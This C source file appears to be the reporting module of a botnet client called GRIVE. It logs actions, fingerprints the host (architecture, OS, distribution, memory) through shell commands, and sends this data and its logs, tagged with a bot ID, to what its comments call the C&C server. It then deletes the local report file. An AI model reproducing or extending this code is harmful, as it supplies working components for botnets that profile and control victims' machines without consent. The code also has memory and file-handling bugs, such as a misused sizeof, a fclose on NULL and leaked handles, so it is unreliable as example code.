#include "reporter.h"
#include"security.h"
#include <arpa/inet.h>
#include <stdio.h>
#include<stdlib.h>
#include <time.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <errno.h>


// printlog : the function of logging locally all the action performed on the device   
char* log_editor(char *action, bool success){
    char* log;
    log = (char*) malloc(sizeof(char)* (strlen(action)+21));
    memset(log, 0, sizeof(log));
    sprintf(log, "action: %s, success: %d", action, success);
    return log;
}

void printLog(char* log){

    time_t seconds;
    seconds = time(NULL);
    struct tm *ptm = localtime(&seconds);

    FILE* logfile = fopen("/tmp/GRIVE_logfile.txt", "a");
    if(logfile != NULL)
     fprintf(logfile, "%02d/%02d/%02d %02d:%02d:%02d : %s \n", ptm->tm_mday, ptm->tm_mon+1, ptm->tm_year+1900, ptm->tm_hour, 
           ptm->tm_min, ptm->tm_sec, log);
        fclose(logfile);

}
// send_msg : function to send messages to the server: we only put the bot id at the begining

bool send_msg(int sockfd, char* m, int BOT_ID){
    char* msg;
    msg = (char*) malloc(sizeof(char)* (strlen(m)+7));
    sprintf(msg, "[%d] %s", BOT_ID, m);
   // printf("%s\n", msg);
    if (!send(sockfd, msg, strlen(msg), 0))
        return false;
    return true;
}

// send_log: C function to send logs to the C&C server

bool send_log(int sockfd, char* log, int BOT_ID){

    char *m;
    m = (char*) malloc(sizeof(char)* (strlen(log)+6));
    sprintf(m, "log:%s\n", log);

    if(!send_msg(sockfd, m, BOT_ID)){
        return false;
    }
    return true;

}

bool secure_msg(){

char* message= "grive envole toi";
char* encoded="";
char* decoded="";
char plain[16]= "grive envole toi";

        memset(plain, 0, 16);
        AesContext context;

        const uint8_t  key[16] ={0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c};
        uint8_t output [AES_BLOCK_SIZE];
        memcpy(plain, message, 16);
        //printf("%x", buffer[16])
        printf("Plain : %s\n", message);
        AesInitialise128(key, &context);
        uint8_t* unsi_plain = (uint8_t*)plain;
        AesEncrypt(&context, unsi_plain, output);
        char* cipher = (char*) output;
        printf("Cipher: %s\n", cipher);
        encoded = base64_encode(cipher);
        printf("%s\n", encoded);
        decoded =  base64_decode(encoded);
        printf("%s\n", decoded);
        AesDecryptInPlace(&context, unsi_plain);
        printf("Dipher: %s\n", (char *) unsi_plain);
        printf("\n"); 
        printf("\n");
//encrypt the message
// firts we will assume that the messahe is 16 bit lenght
//


}

// collect the system information on aa temp file the send them to the bot
void print_repo(char* log){

    time_t seconds;
    seconds = time(NULL);
    struct tm *ptm = localtime(&seconds);

    FILE* logfile = fopen("report.txt", "a");
    if(logfile != NULL)
     fprintf(logfile, "%02d/%02d/%02d %02d:%02d:%02d : %s \n", ptm->tm_mday, ptm->tm_mon+1, ptm->tm_year+1900, ptm->tm_hour, 
           ptm->tm_min, ptm->tm_sec, log);
        fclose(logfile);

}

bool system_info(int sockfd){

  FILE *fp;
  char* path = (char*) malloc(50*sizeof(char));

  /* Open the command for reading. */

// send the architecture type
  fp = popen("/bin/echo 'Arch: ' $(uname -m);", "r");
  if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(1);
    return -1;
  }
  fgets(path,50*sizeof(char), fp);
  send(sockfd, path, strlen(path), 0);
// send the operationg system
  fp = popen("/bin/echo 'OS: ' $(uname);", "r");
  if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(1);
    return -1;
  }
  fgets(path,50*sizeof(char), fp);
  send(sockfd, path, strlen(path), 0);
// send the linux distribution name of the machine
    fp = popen("/bin/grep ^ID= /etc/*-release ;", "r");
  if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(1);
    return -1;
  }
  fgets(path,50*sizeof(char), fp);
  send(sockfd, path, strlen(path), 0);
// send the total amount of ram memory
    fp = popen("/bin/grep MemTotal /proc/meminfo;", "r");
  if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(1);
    return -1;
  }
  fgets(path,50*sizeof(char), fp);
  send(sockfd, path, strlen(path), 0);
// send the free amount of ram memory
  fp = popen("/bin/grep MemFree /proc/meminfo;", "r");
  if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(1);
    return -1;
  }
    fgets(path, 50*sizeof(char), fp);
  send(sockfd, path, strlen(path), 0);

  /* close */
  pclose(fp);

  return 0;
}

bool report(int sockfd, int BOT_ID){
    
    FILE * fp;
    char * line = NULL;
    size_t len = 0;
    ssize_t read;
    fp = fopen("report.txt", "r");
    if (fp == NULL)
        return 0;

    while ((read = getline(&line, &len, fp)) != -1) {
            send_msg(sockfd, line, BOT_ID);
    }
    fclose(fp);
    if (line)
    free(line);
    remove("report.txt");
    return 1;

}